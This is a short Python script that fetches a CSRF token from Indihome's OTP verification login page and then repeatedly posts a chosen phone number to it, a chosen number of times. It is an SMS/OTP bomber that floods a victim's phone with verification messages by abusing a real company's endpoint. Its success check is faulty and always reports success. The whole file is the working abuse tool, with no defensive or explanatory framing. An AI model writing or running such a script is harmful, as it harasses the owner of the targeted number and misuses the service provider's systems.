import requests
import re
import sys

s = requests.Session()

url = "https://www.indihome.co.id/verifikasi-layanan/login-verifikasi-otp"

no = input("NO: ")
jm = input("jumlah: ")

token = s.get(url).text
token = re.findall(r"name=\"_token\" value=\"(.*?)\"", token)[0]
print(token)

data = {
"_token":token,
"msisdn":no
}


for c in range(int(jm)):
    send = s.post(url, data=data).text
    if 'Gagal!' or 'dikirim' in send:
        print("sukses")
    else:
        print("eror")
        sys.exit()
